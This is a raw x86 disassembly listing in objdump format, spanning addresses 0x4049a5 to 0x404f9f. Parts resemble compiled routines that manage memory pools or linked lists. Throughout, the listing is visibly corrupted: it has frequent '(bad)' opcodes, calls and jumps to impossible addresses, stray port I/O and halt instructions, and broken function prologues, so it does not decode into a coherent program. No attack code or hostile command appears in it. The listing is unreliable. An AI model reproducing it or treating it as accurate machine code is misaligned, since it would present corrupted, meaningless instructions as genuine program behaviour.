  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	c6                   	(bad)
  4049a8:	1c 29                	sbb    $0x29,%al
  4049aa:	02 fc                	add    %ah,%bh
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	5e                   	pop    %esi
  4049af:	8b e5                	mov    %ebp,%esp
  4049b1:	5d                   	pop    %ebp
  4049b2:	44                   	inc    %esp
  4049b3:	8b 6d dc             	mov    -0x24(%ebp),%ebp
  4049b6:	02 41 00             	add    0x0(%ecx),%al
  4049b9:	68 8c f3 40 00       	push   $0x40f38c
  4049be:	48                   	dec    %eax
  4049bf:	e8 2c 0c 00 00       	call   0x4055f0
  4049c4:	8b 15 46 02 41 fd    	mov    0xfd410246,%edx
  4049ca:	52                   	push   %edx
  4049cb:	e8 33 59 71 00       	call   0xb1a303
  4049d0:	85 c0                	test   %eax,%eax
  4049d2:	75 39                	jne    0x404a0d
  4049d4:	7a 7d                	jp     0x404a53
  4049d6:	02 41 9d             	add    -0x63(%ecx),%al
  4049d9:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4049dc:	50                   	push   %eax
  4049dd:	6a 00                	push   $0x0
  4049df:	9d                   	popf
  4049e0:	e8 fb 57 00 da       	call   0xda40a1e0
  4049e5:	85 c0                	test   %eax,%eax
  4049e7:	75 24                	jne    0x404a0d
  4049e9:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4049ec:	a1 e0 02 1d 00       	mov    0x1d02e0,%eax
  4049f1:	52                   	push   %edx
  4049f2:	50                   	push   %eax
  4049f3:	e8 08 ff ff ff       	call   0x404900
  4049f8:	8b 0d f0 d1 41 00    	mov    0x41d1f0,%ecx
  4049fe:	8b 15 e0 e7 41 00    	mov    0x41e7e0,%edx
  404a04:	51                   	push   %ecx
  404a05:	52                   	push   %edx
  404a06:	e8 15 ff f0 ff       	call   0x314920
  404a0b:	53                   	push   %ebx
  404a0c:	c0 39 8b             	sarb   $0x8b,(%ecx)
  404a0f:	e5 ee                	in     $0xee,%eax
  404a11:	0c 90                	or     $0x90,%al
  404a13:	11 90 02 90 90 90    	adc    %edx,-0x6f6f6ffe(%eax)
  404a19:	90                   	nop
  404a1a:	c9                   	leave
  404a1b:	90                   	nop
  404a1c:	90                   	nop
  404a1d:	90                   	nop
  404a1e:	90                   	nop
  404a1f:	90                   	nop
  404a20:	a0 9e 02 41 3c       	mov    0x3c41029e,%al
  404a25:	84 a3 44 28 7f c8    	test   %ah,-0x3780d7bc(%ebx)
  404a2b:	a2 d8 02 41 00       	mov    %al,0x4102d8
  404a30:	75 1f                	jne    0x404a51
  404a32:	34 ad                	xor    $0xad,%al
  404a34:	83 41 00 12          	addl   $0x12,0x0(%ecx)
  404a38:	e8 c3 03 00 eb       	call   0xeb404e00
  404a3d:	c7 05 fe 02 b5 00 6c 	movl   $0x6c,0xb502fe
  404a44:	00 00 00 
  404a47:	c7                   	(bad)
  404a48:	b4 e0                	mov    $0xe0,%ah
  404a4a:	02 b9 00 84 00 00    	add    0x8400(%ecx),%bh
  404a50:	06                   	push   %es
  404a51:	c3                   	ret
  404a52:	01 76 90             	add    %esi,-0x70(%esi)
  404a55:	22 90 51 90 90 90    	and    -0x6f6f6faf(%eax),%dl
  404a5b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404a5c:	90                   	nop
  404a5d:	90                   	nop
  404a5e:	90                   	nop
  404a5f:	90                   	nop
  404a60:	55                   	push   %ebp
  404a61:	8b ec                	mov    %esp,%ebp
  404a63:	83 8e 0c 8b 45 8a 21 	orl    $0x21,-0x75ba74f4(%esi)
  404a6a:	56                   	push   %esi
  404a6b:	57                   	push   %edi
  404a6c:	8d 50 07             	lea    0x7(%eax),%edx
  404a6f:	42                   	inc    %edx
  404a70:	e2 f8                	loop   0x404a6a
  404a72:	ec                   	in     (%dx),%al
  404a73:	dd 8b e2 f4 89 55    	fisttpll 0x5589f4e2(%ebx)
  404a79:	81 73 1d 8b 40 20 85 	xorl   $0x8520408b,0x1d(%ebx)
  404a80:	c0 0f 84             	rorb   $0x84,(%edi)
  404a83:	46                   	inc    %esi
  404a84:	51                   	push   %ecx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	ee                   	out    %al,(%dx)
  404a88:	ee                   	out    %al,(%dx)
  404a89:	ff 10                	call   *(%eax)
  404a8b:	d1 c4                	rol    $1,%esp
  404a8d:	04 33                	add    $0x33,%al
  404a8f:	c0 5f 5e 5b          	rcrb   $0x5b,0x5e(%edi)
  404a93:	8b e5                	mov    %ebp,%esp
  404a95:	5d                   	pop    %ebp
  404a96:	c2 08 00             	ret    $0x8
  404a99:	6c                   	insb   (%dx),%es:(%edi)
  404a9a:	43                   	inc    %ebx
  404a9b:	2c 8b                	sub    $0x8b,%al
  404a9d:	f5                   	cmc
  404a9e:	10 8b 7e 14 2b f9    	adc    %cl,-0x6d4eb82(%ebx)
  404aa4:	0b d7                	or     %edi,%edx
  404aa6:	77 10                	ja     0x404ab8
  404aa8:	03 d1                	add    %ecx,%edx
  404aaa:	5f                   	pop    %edi
  404aab:	89 56 10             	mov    %edx,0x10(%esi)
  404aae:	f2 8b c1             	repnz mov %ecx,%eax
  404ab1:	5b                   	pop    %ebx
  404ab2:	a9 e5 5d c2 08       	test   $0x8c25de5,%eax
  404ab7:	00 8b 0e 8b d1 14    	add    %cl,0x14d18b0e(%ebx)
  404abd:	49                   	dec    %ecx
  404abe:	59                   	pop    %ecx
  404abf:	45                   	inc    %ebp
  404ac0:	2b fb                	sub    %ebx,%edi
  404ac2:	3b 98 29 14 8b 41    	cmp    0x418b1429(%eax),%ebx
  404ac8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404ac9:	74 39                	je     0x404b04
  404acb:	89 38                	mov    %edi,(%eax)
  404acd:	8b 01                	mov    (%ecx),%eax
  404acf:	8b 79 04             	mov    0x4(%ecx),%edi
  404ad2:	89 78 04             	mov    %edi,0x4(%eax)
  404ad5:	e9 70 01 00 00       	jmp    0x404c4a
  404ada:	8b 78 18             	mov    0x18(%eax),%edi
  404add:	2c 9a                	sub    $0x9a,%al
  404adf:	17                   	pop    %ss
  404ae0:	10 00                	adc    %al,(%eax)
  404ae2:	00 81 e3 00 f0 ff    	add    %al,-0xfff1d(%ecx)
  404ae8:	ff                   	(bad)
  404ae9:	3b da                	cmp    %edx,%ebx
  404aeb:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  404aee:	0f 82 cb 90 00 00    	jb     0x40dbbf
  404af4:	81 bb 00 20 15 00 73 	cmpl   $0x45c70a73,0x152000(%ebx)
  404afb:	0a c7 45 
  404afe:	0c 00                	or     $0x0,%al
  404b00:	20 00                	and    %al,(%eax)
  404b02:	05 8b 8a 0c 8b       	add    $0x8b0c8a8b,%eax
  404b07:	d3 c1                	rol    %cl,%ecx
  404b09:	ea 29 4a 83 fa ff 89 	ljmp   $0x89ff,$0xfa834a29
  404b10:	55                   	push   %ebp
  404b11:	fc                   	cld
  404b12:	0f 87 a7 01 00 00    	ja     0x404cbf
  404b18:	3b 17                	cmp    (%edi),%edx
  404b1a:	b0 ea                	mov    $0xea,%al
  404b1c:	5d                   	pop    %ebp
  404b1d:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  404b21:	5a                   	pop    %edx
  404b22:	0c 85                	or     $0x85,%al
  404b24:	c0 74 09 1b e8       	shlb   $0xe8,0x1b(%ecx,%ecx,1)
  404b29:	a3 57 00 00 05       	mov    %eax,0x5000057
  404b2e:	55                   	push   %ebp
  404b2f:	fc                   	cld
  404b30:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  404b33:	14 8b                	adc    $0x8b,%al
  404b35:	0f 8d 44 97 14 85    	jge    0x8554e27f
  404b3b:	db 75 0f             	(bad) 0xf(%ebp)
  404b3e:	3b 47 73             	cmp    0x73(%edi),%eax
  404b41:	0b 8b 58 04 83 f0    	or     -0xf7cfba8(%ebx),%ecx
  404b47:	04 42                	add    $0x42,%al
  404b49:	f9                   	stc
  404b4a:	db 74 f1 8b          	(bad) -0x75(%ecx,%esi,8)
  404b4e:	18 85 db 89 05 f4    	sbb    %al,-0xbfa7625(%ebp)
  404b54:	6e                   	outsb  %ds:(%esi),(%dx)
  404b55:	dd 8b 50 85 db 89    	fisttpll -0x76247ab0(%ebx)
  404b5b:	61                   	popa
  404b5c:	75 15                	jne    0x404b73
  404b5e:	3b d1                	cmp    %ecx,%edx
  404b60:	72 11                	jb     0x404b73
  404b62:	58                   	pop    %eax
  404b63:	50                   	push   %eax
  404b64:	83 bc e8 04 00 85 d2 	cmpl   $0x75,-0x2d7afffc(%eax,%ebp,8)
  404b6b:	75 
  404b6c:	04 85                	add    $0x85,%al
  404b6e:	c9                   	leave
  404b6f:	77 a4                	ja     0x404b15
  404b71:	89 50 8b             	mov    %edx,-0x75(%eax)
  404b74:	5d                   	pop    %ebp
  404b75:	f4                   	hlt
  404b76:	8b 47 08             	mov    0x8(%edi),%eax
  404b79:	8b 4b 08             	mov    0x8(%ebx),%ecx
  404b7c:	03 c1                	add    %ecx,%eax
  404b7e:	89 47 08             	mov    %eax,0x8(%edi)
  404b81:	8b c8                	mov    %eax,%ecx
  404b83:	8b 47 04             	mov    0x4(%edi),%eax
  404b86:	3b c8                	cmp    %eax,%ecx
  404b88:	76 03                	jbe    0x404b8d
  404b8a:	89 63 08             	mov    %esp,0x8(%ebx)
  404b8d:	8b 7f 0c             	mov    0xc(%edi),%edi
  404b90:	85 ff                	test   %edi,%edi
  404b92:	74 06                	je     0x404b9a
  404b94:	57                   	push   %edi
  404b95:	e8 a8 57 00 00       	call   0x40a342
  404b9a:	8d a3 18 89 53 64    	lea    0x64538918(%ebx),%esp
  404ba0:	e9 9a 00 00 00       	jmp    0x404c3f
  404ba5:	8b 47 14             	mov    0x14(%edi),%eax
  404ba8:	85 c0                	test   %eax,%eax
  404baa:	74 39                	je     0x404be5
  404bac:	97                   	xchg   %eax,%edi
  404bad:	47                   	inc    %edi
  404bae:	0c 85                	or     $0x85,%al
  404bb0:	c0 74 06 50 e8       	shlb   $0xe8,0x50(%esi,%eax,1)
  404bb5:	17                   	pop    %ss
  404bb6:	57                   	push   %edi
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	b9 5f 14 8d 47       	mov    $0x478d145f,%ecx
  404bbe:	14 85                	adc    $0x85,%al
  404bc0:	db 74 12 8b          	(bad) -0x75(%edx,%edx,1)
  404bc4:	4d                   	dec    %ebp
  404bc5:	fc                   	cld
  404bc6:	8b 53 08             	mov    0x8(%ebx),%edx
  404bc9:	2d ca 76 46 8b       	sub    $0x8b4676ca,%eax
  404bce:	c3                   	ret
  404bcf:	8b 72 85             	mov    -0x7b(%edx),%esi
  404bd2:	db 98 ee 8b 7f 18    	fistpl 0x187f8bee(%eax)
  404bd8:	85 ff                	test   %edi,%edi
  404bda:	74 06                	je     0x404be2
  404bdc:	57                   	push   %edi
  404bdd:	e8 d9 57 00 00       	call   0x40a3bb
  404be2:	47                   	inc    %edi
  404be3:	5d                   	pop    %ebp
  404be4:	0c 53                	or     $0x53,%al
  404be6:	ff 15 5c 62 40 00    	call   *0x40625c
  404bec:	83 c4 04             	add    $0x4,%esp
  404bef:	85 c0                	test   %eax,%eax
  404bf1:	0f 44 ec             	cmove  %esp,%ebp
  404bf4:	00 00                	add    %al,(%eax)
  404bf6:	00 8b 55 fc 33 48    	add    %cl,0x4833fc55(%ebx)
  404bfc:	16                   	push   %ss
  404bfd:	89 50 7b             	mov    %edx,0x7b(%eax)
  404c00:	8d 14 9a             	lea    (%edx,%ebx,4),%edx
  404c03:	89 48 10             	mov    %ecx,0x10(%eax)
  404c06:	4b                   	dec    %ebx
  404c07:	18 00                	sbb    %al,(%eax)
  404c09:	00 de                	add    %bl,%dh
  404c0b:	00 89 d5 2a 8b c8    	add    %cl,-0x3774d52b(%ecx)
  404c11:	eb 34                	jmp    0x404c47
  404c13:	8b 13                	mov    (%ebx),%edx
  404c15:	89 10                	mov    %edx,(%eax)
  404c17:	8b 43 08             	mov    0x8(%ebx),%eax
  404c1a:	8b 4f 3e             	mov    0x3e(%edi),%ecx
  404c1d:	03 c8                	add    %eax,%ecx
  404c1f:	8b 47 04             	mov    0x4(%edi),%eax
  404c22:	3b 8e 8b 4f 08 76    	cmp    0x76084f8b(%esi),%ecx
  404c28:	03 89 63 08 8b 7f    	add    0x7f8b0863(%ecx),%ecx
  404c2e:	73 19                	jae    0x404c49
  404c30:	ff 74 06 57          	push   0x57(%esi,%eax,1)
  404c34:	e8 07 57 00 00       	call   0x40a340
  404c39:	97                   	xchg   %eax,%edi
  404c3a:	4b                   	dec    %ebx
  404c3b:	18 89 4b 10 c7 03    	sbb    %cl,0x3c7104b(%ecx)
  404c41:	00 00                	add    %al,(%eax)
  404c43:	00 00                	add    %al,(%eax)
  404c45:	8b cb                	mov    %ebx,%ecx
  404c47:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  404c4a:	8b 41 10             	mov    0x10(%ecx),%eax
  404c4d:	c7 41 0c 00 68 00 c3 	movl   $0xc3006800,0xc(%ecx)
  404c54:	03 d0                	add    %eax,%edx
  404c56:	89 51 2d             	mov    %edx,0x2d(%ecx)
  404c59:	8b 8c 04 3b 51 04 89 	mov    -0x76fbaec5(%esp,%eax,1),%ecx
  404c60:	0a 67 55             	or     0x55(%edi),%ah
  404c63:	08 89 31 89 39 04    	or     %cl,0x4398931(%ecx)
  404c69:	89 4a 2c             	mov    %ecx,0x2c(%edx)
  404c6c:	45                   	inc    %ebp
  404c6d:	4e                   	dec    %esi
  404c6e:	d1 94 7e 53 2b cf 8b 	rcll   $1,-0x7430d4ad(%esi,%edi,2)
  404c75:	3e 81 c1 c9 10 00 e0 	ds add $0xe00010c9,%ecx
  404c7c:	8b d7                	mov    %edi,%edx
  404c7e:	57                   	push   %edi
  404c7f:	e1 00                	loope  0x404c81
  404c81:	f0 ff                	lock (bad)
  404c83:	ff 49 c1             	decl   -0x3f(%ecx)
  404c86:	5d                   	pop    %ebp
  404c87:	f7 89 4e 0c 8b 5a 0c 	testl  $0x73cb3b0c,0x5a8b0c4e(%ecx)
  404c8e:	3b cb 73 
  404c91:	21 8b 12 5e 4a 18    	and    %ecx,0x184a5e12(%ebx)
  404c97:	72 f9                	jb     0x404c92
  404c99:	8b ea                	mov    %edx,%ebp
  404c9b:	04 89                	add    $0x89,%al
  404c9d:	39 b5 0e 8b 7e 04    	cmp    %esi,0x47e8b0e(%ebp)
  404ca3:	89 79 bd             	mov    %edi,-0x43(%ecx)
  404ca6:	8b 4a 04             	mov    0x4(%edx),%ecx
  404ca9:	3c 4e                	cmp    $0x4e,%al
  404cab:	04 89                	add    $0x89,%al
  404cad:	31 5f 16             	xor    %ebx,0x16(%edi)
  404cb0:	89 e4                	mov    %esp,%esp
  404cb2:	04 5f                	add    $0x5f,%al
  404cb4:	e9 5b 8b e5 5d       	jmp    0x5e25d814
  404cb9:	c2 08 00             	ret    $0x8
  404cbc:	8b 6c 08 8b          	mov    -0x75(%eax,%ecx,1),%ebp
  404cc0:	40                   	inc    %eax
  404cc1:	20 85 c0 74 07 6a    	and    %al,0x6a0774c0(%ebp)
  404cc7:	0c 44                	or     $0x44,%al
  404cc9:	d0 83 c4 04 5f 5e    	rolb   $1,0x5e5f04c4(%ebx)
  404ccf:	33 ae 5b 8b 2f 5d    	xor    0x5d2f8b5b(%esi),%ebp
  404cd5:	c2 08 00             	ret    $0x8
  404cd8:	90                   	nop
  404cd9:	90                   	nop
  404cda:	90                   	nop
  404cdb:	90                   	nop
  404cdc:	90                   	nop
  404cdd:	90                   	nop
  404cde:	e5 70                	in     $0x70,%eax
  404ce0:	55                   	push   %ebp
  404ce1:	8b ec                	mov    %esp,%ebp
  404ce3:	83 32 63             	xorl   $0x63,(%edx)
  404ce6:	b9 56 9e 44 7d       	mov    $0x7d449e56,%ecx
  404ceb:	08 8d 77 38 56 e8    	or     %cl,-0x17a9c789(%ebp)
  404cf1:	fb                   	sti
  404cf2:	09 00                	or     %eax,(%eax)
  404cf4:	00 ad 47 04 33 36    	add    %ch,0x36330447(%ebp)
  404cfa:	83 c4 04             	add    $0x4,%esp
  404cfd:	3b c3                	cmp    %ebx,%eax
  404cff:	89 1e                	mov    %ebx,(%esi)
  404d01:	89 5f 3c             	mov    %ebx,0x3c(%edi)
  404d04:	74 0d                	je     0x404d13
  404d06:	73 e8                	jae    0x404cf0
  404d08:	f4                   	hlt
  404d09:	00 18                	add    %bl,(%eax)
  404d0b:	00 8b 47 04 3b c3    	add    %cl,-0x3cc4fbb9(%ebx)
  404d11:	21 fb                	and    %edi,%ebx
  404d13:	8d 77 10             	lea    0x10(%edi),%esi
  404d16:	56                   	push   %esi
  404d17:	e8 d4 09 24 00       	call   0x6456f0
  404d1c:	8b 47 1c             	mov    0x1c(%edi),%eax
  404d1f:	89 1e                	mov    %ebx,(%esi)
  404d21:	84 35 5f 14 e8 06    	test   %dh,0x6e8145f
  404d27:	0a 00                	or     (%eax),%al
  404d29:	00 8b 47 30 8b 4f    	add    %cl,0x4f8b3047(%ebx)
  404d2f:	34 a8                	xor    $0xa8,%al
  404d31:	5f                   	pop    %edi
  404d32:	1c 89                	sbb    $0x89,%al
  404d34:	5f                   	pop    %edi
  404d35:	28 89 71 2c 89 48    	sub    %cl,0x48892c71(%ecx)
  404d3b:	f4                   	hlt
  404d3c:	02 24 fa             	add    (%edx,%edi,8),%ah
  404d3f:	c4                   	(bad)
  404d40:	f3 3b c8             	repz cmp %eax,%ecx
  404d43:	89 c1                	mov    %eax,%ecx
  404d45:	99                   	cltd
  404d46:	0f 84 a9 00 00 8d    	je     0x8d404df5
  404d4c:	62 50 04             	bound  %edx,0x4(%eax)
  404d4f:	57                   	push   %edi
  404d50:	1a 6a 7f             	sbb    0x7f(%edx),%ch
  404d53:	26 8b 30             	mov    %es:(%eax),%esi
  404d56:	8b 47 b3             	mov    -0x4d(%edi),%eax
  404d59:	85 c0                	test   %eax,%eax
  404d5b:	74 fd                	je     0x404d5a
  404d5d:	10 f2                	adc    %dh,%dl
  404d5f:	6d                   	insl   (%dx),%es:(%edi)
  404d60:	55                   	push   %ebp
  404d61:	00 00                	add    %al,(%eax)
  404d63:	8b 07                	mov    (%edi),%eax
  404d65:	8b d9                	mov    %ecx,%ebx
  404d67:	04 8b                	add    $0x8b,%al
  404d69:	57                   	push   %edi
  404d6a:	58                   	pop    %eax
  404d6b:	89 45 08             	mov    %eax,0x8(%ebp)
  404d6e:	1a 4d fc             	sbb    -0x4(%ebp),%cl
  404d71:	8b 06                	mov    (%esi),%eax
  404d73:	8b 4d 9d             	mov    -0x63(%ebp),%ecx
  404d76:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404d79:	8b 46 08             	mov    0x8(%esi),%eax
  404d7c:	85 7b d4             	test   %edi,-0x2c(%ebx)
  404d7f:	0a 3b                	or     (%ebx),%bh
  404d81:	c2 76 85             	ret    $0x8576
  404d84:	89 1e                	mov    %ebx,(%esi)
  404d86:	b4 de                	mov    $0xde,%ah
  404d88:	eb 89                	jmp    0x404d13
  404d8a:	83 f8 14             	cmp    $0x14,%eax
  404d8d:	73 18                	jae    0x404da7
  404d8f:	8b cf                	mov    %edi,%ecx
  404d91:	87 14 85 c9 89 0e 89 	xchg   %edx,-0x76f17637(,%eax,4)
  404d98:	08 3b                	or     %bh,(%ebx)
  404d9a:	45                   	inc    %ebp
  404d9b:	08 76 03             	or     %dh,0x3(%esi)
  404d9e:	89 45 08             	mov    %eax,0x8(%ebp)
  404da1:	f5                   	cmc
  404da2:	74 87                	je     0x404d2b
  404da4:	14 eb                	adc    $0xeb,%al
  404da6:	08 8b 4f 14 89 0e    	or     %cl,0xe89144f(%ebx)
  404dac:	89 77 08             	mov    %esi,0x8(%edi)
  404daf:	3b d0                	cmp    %eax,%edx
  404db1:	72 04                	jb     0x404db7
  404db3:	2b d0                	sub    %eax,%edx
  404db5:	eb 02                	jmp    0x404db9
  404db7:	27                   	daa
  404db8:	d2 06                	rolb   %cl,(%esi)
  404dba:	75 79                	jne    0x404e35
  404dbc:	85 f6                	test   %esi,%esi
  404dbe:	75 b1                	jne    0x404d71
  404dc0:	8b 45 fa             	mov    -0x6(%ebp),%eax
  404dc3:	89 57 08             	mov    %edx,0x8(%edi)
  404dc6:	9e                   	sahf
  404dc7:	4c                   	dec    %esp
  404dc8:	8b 7f 0c             	mov    0xc(%edi),%edi
  404dcb:	85 ff                	test   %edi,%edi
  404dcd:	43                   	inc    %ebx
  404dce:	06                   	push   %es
  404dcf:	57                   	push   %edi
  404dd0:	e8 6b 55 ae 00       	call   0xeea340
  404dd5:	85 db                	test   %ebx,%ebx
  404dd7:	74 14                	je     0x404ded
  404dd9:	8b 35 30 c1 91 e8    	mov    0xe891c130,%esi
  404ddf:	8b c3                	mov    %ebx,%eax
  404de1:	7d 1b                	jge    0x404dfe
  404de3:	50                   	push   %eax
  404de4:	ff d6                	call   *%esi
  404de6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404de7:	c4 04 85 db 75 f2 8b 	les    -0x740d8a25(,%eax,4),%eax
  404dee:	45                   	inc    %ebp
  404def:	f4                   	hlt
  404df0:	34 00                	xor    $0x0,%al
  404df2:	89 2c 04             	mov    %ebp,(%esp,%eax,1)
  404df5:	5f                   	pop    %edi
  404df6:	5e                   	pop    %esi
  404df7:	5b                   	pop    %ebx
  404df8:	8b e5                	mov    %ebp,%esp
  404dfa:	5d                   	pop    %ebp
  404dfb:	07                   	pop    %es
  404dfc:	04 00                	add    $0x0,%al
  404dfe:	1a 90 55 8b ec 83    	sbb    -0x7c1374ab(%eax),%dl
  404e04:	ec                   	in     (%dx),%al
  404e05:	0c 53                	or     $0x53,%al
  404e07:	79 5d                	jns    0x404e66
  404e09:	08 56 57             	or     %dl,0x57(%esi)
  404e0c:	f1                   	int1
  404e0d:	73 77                	jae    0x404e86
  404e0f:	56                   	push   %esi
  404e10:	e8 db 08 00 00       	call   0x4056f0
  404e15:	07                   	pop    %es
  404e16:	43                   	inc    %ebx
  404e17:	12 83 c4 04 85 64    	adc    0x648504c4(%ebx),%al
  404e1d:	c7 06 f1 e6 00 00    	movl   $0xe6f1,(%esi)
  404e23:	c7 43 3c 00 00 00 00 	movl   $0x0,0x3c(%ebx)
  404e2a:	74 0d                	je     0x404e39
  404e2c:	50                   	push   %eax
  404e2d:	e8 ce ff ff ff       	call   0x404e00
  404e32:	c4 43 04             	les    0x4(%ebx),%eax
  404e35:	85 c0                	test   %eax,%eax
  404e37:	75 f3                	jne    0x404e2c
  404e39:	fa                   	cli
  404e3a:	43                   	inc    %ebx
  404e3b:	8c 50 e8             	mov    %ss,-0x18(%eax)
  404e3e:	ae                   	scas   %es:(%edi),%al
  404e3f:	08 00                	or     %al,(%eax)
  404e41:	00 e0                	add    %ah,%al
  404e43:	4b                   	dec    %ebx
  404e44:	1c 51                	sbb    $0x51,%al
  404e46:	e8 e5 08 00 00       	call   0x405730
  404e4b:	8b 03                	mov    (%ebx),%eax
  404e4d:	83 c4 69             	add    $0x69,%esp
  404e50:	5f                   	pop    %edi
  404e51:	c0 74 35 8b 46       	shlb   $0x46,-0x75(%ebp,%esi,1)
  404e56:	18 3e                	sbb    %bh,(%esi)
  404e58:	e8 b3 cd ff 72       	call   0x73401c10
  404e5d:	8b f0                	mov    %eax,%esi
  404e5f:	85 f6                	test   %esi,%esi
  404e61:	b0 06                	mov    $0x6,%al
  404e63:	56                   	push   %esi
  404e64:	e8 67 54 00 d1       	call   0xd140a2d0
  404e69:	8b 43 53             	mov    0x53(%ebx),%eax
  404e6c:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  404e6f:	89 08                	mov    %ecx,(%eax)
  404e71:	8b 43 0c             	mov    0xc(%ebx),%eax
  404e74:	83 b6 00 e3 06 8b 53 	xorl   $0x53,-0x74f91d00(%esi)
  404e7b:	08 89 42 0c 18 67    	or     %cl,0x67180c42(%ecx)
  404e81:	88 06                	mov    %al,(%esi)
  404e83:	56                   	push   %esi
  404e84:	e8 b7 54 00 00       	call   0x40a340
  404e89:	8b 73 30             	mov    0x30(%ebx),%esi
  404e8c:	8b 7b e8             	mov    -0x18(%ebx),%edi
  404e8f:	57                   	push   %edi
  404e90:	8b 46 04             	mov    0x4(%esi),%eax
  404e93:	b7 00                	mov    $0x0,%bh
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	e8 f4 fa 29 ff       	call   0xff6a4992
  404e9e:	3b c3                	cmp    %ebx,%eax
  404ea0:	75 08                	jne    0x404eaa
  404ea2:	6a 00                	push   $0x0
  404ea4:	e9 e9 56 fa ff       	jmp    0x3aa592
  404ea9:	ff 8b 47 0c 33 db    	decl   -0x24ccf3b9(%ebx)
  404eaf:	85 c0                	test   %eax,%eax
  404eb1:	74 06                	je     0x404eb9
  404eb3:	50                   	push   %eax
  404eb4:	26 17                	es pop %ss
  404eb6:	54                   	push   %esp
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	88 05 04 b9 0f 89    	mov    %al,0x890fb904
  404ebf:	e6 f8                	out    %al,$0xf8
  404ec1:	8b 57 08             	mov    0x8(%edi),%edx
  404ec4:	e7 4d                	out    %eax,$0x4d
  404ec6:	fc                   	cld
  404ec7:	c0 06 81             	rolb   $0x81,(%esi)
  404eca:	ab                   	stos   %eax,%es:(%edi)
  404ecb:	f8                   	clc
  404ecc:	89 45 26             	mov    %eax,0x26(%ebp)
  404ecf:	8b 46 08             	mov    0x8(%esi),%eax
  404ed2:	85 c9                	test   %ecx,%ecx
  404ed4:	74 9c                	je     0x404e72
  404ed6:	3b c2                	cmp    %edx,%eax
  404ed8:	76 06                	jbe    0x404ee0
  404eda:	89 2b                	mov    %ebp,(%ebx)
  404edc:	8b de                	mov    %esi,%ebx
  404ede:	eb 2f                	jmp    0x404f0f
  404ee0:	83 f8 14             	cmp    $0x14,%eax
  404ee3:	73 18                	jae    0x404efd
  404ee5:	31 39                	xor    %edi,(%ecx)
  404ee7:	de 54 85 c9          	ficoms -0x37(%ebp,%eax,4)
  404eeb:	89 0e                	mov    %ecx,(%esi)
  404eed:	75 08                	jne    0x404ef7
  404eef:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  404ef2:	76 03                	jbe    0x404ef7
  404ef4:	e1 45                	loope  0x404f3b
  404ef6:	fc                   	cld
  404ef7:	89 01                	mov    %eax,(%ecx)
  404ef9:	87 14 eb             	xchg   %edx,(%ebx,%ebp,8)
  404efc:	5e                   	pop    %esi
  404efd:	8b 4f 14             	mov    0x14(%edi),%ecx
  404f00:	89 0e                	mov    %ecx,(%esi)
  404f02:	81 77 14 3b d0 72 04 	xorl   $0x472d03b,0x14(%edi)
  404f09:	93                   	xchg   %eax,%ebx
  404f0a:	d0 6c 02 33          	shrb   $1,0x33(%edx,%eax,1)
  404f0e:	21 8b 75 f4 85 f6    	and    %ecx,-0x97a0b8b(%ebx)
  404f14:	bc b1 8b 45 fc       	mov    $0xfc458bb1,%esp
  404f19:	89 57 08             	mov    %edx,0x8(%edi)
  404f1c:	89 07                	mov    %eax,(%edi)
  404f1e:	8b 47 91             	mov    -0x6f(%edi),%eax
  404f21:	85 c0                	test   %eax,%eax
  404f23:	74 06                	je     0x404f2b
  404f25:	50                   	push   %eax
  404f26:	e8 15 54 00 7a       	call   0x7a40a340
  404f2b:	85 db                	test   %ebx,%ebx
  404f2d:	74 14                	je     0x404f43
  404f2f:	8b 35 50 66 40 00    	mov    0x406650,%esi
  404f35:	8b c3                	mov    %ebx,%eax
  404f37:	8b 1b                	mov    (%ebx),%ebx
  404f39:	77 ff                	ja     0x404f3a
  404f3b:	d6                   	salc
  404f3c:	03 59 04             	add    0x4(%ecx),%ebx
  404f3f:	85 db                	test   %ebx,%ebx
  404f41:	75 f2                	jne    0x404f35
  404f43:	57                   	push   %edi
  404f44:	e8 e7 f9 cd a6       	call   0xa70e4930
  404f49:	3b 45 08             	cmp    0x8(%ebp),%eax
  404f4c:	75 06                	jne    0x404f54
  404f4e:	e7 8a                	out    %eax,$0x8a
  404f50:	fa                   	cli
  404f51:	f9                   	stc
  404f52:	eb ff                	jmp    0x404f53
  404f54:	5f                   	pop    %edi
  404f55:	4e                   	dec    %esi
  404f56:	8b 8b e5 10 c2 04    	mov    0x4c210e5(%ebx),%ecx
  404f5c:	00 90 86 90 b5 97    	add    %dl,-0x684a6f7a(%eax)
  404f62:	ec                   	in     (%dx),%al
  404f63:	c1 45 08 78          	roll   $0x78,0x8(%ebp)
  404f67:	00 00                	add    %al,(%eax)
  404f69:	00 00                	add    %al,(%eax)
  404f6b:	00 8b 45 0c 85 c0    	add    %cl,-0x3f7af3bb(%ebx)
  404f71:	11 6c 41 0d          	adc    %ebp,0xd(%ecx,%eax,2)
  404f75:	dc 9d 41 3b 89 4d    	fcompl 0x4d893b41(%ebp)
  404f7b:	0c 8b                	or     $0x8b,%al
  404f7d:	d8 8b 4d 10 85 c9    	fmuls  -0x367aefb3(%ebx)
  404f83:	73 0a                	jae    0x404f8f
  404f85:	85 59 32             	test   %ebx,0x32(%ecx)
  404f88:	b6 8b                	mov    $0x8b,%dh
  404f8a:	50                   	push   %eax
  404f8b:	20 89 31 10 53 8b    	and    %cl,-0x74acefcf(%ecx)
  404f91:	5d                   	pop    %ebp
  404f92:	14 56                	adc    $0x56,%al
  404f94:	57                   	push   %edi
  404f95:	f5                   	cmc
  404f96:	db 75 03             	(bad) 0x3(%ebp)
  404f99:	8b 58 b3             	mov    -0x4d(%eax),%ebx
  404f9c:	8b 03                	mov    (%ebx),%eax
  404f9e:	cc                   	int3
  404f9f:	01 00                	add    %eax,(%eax)
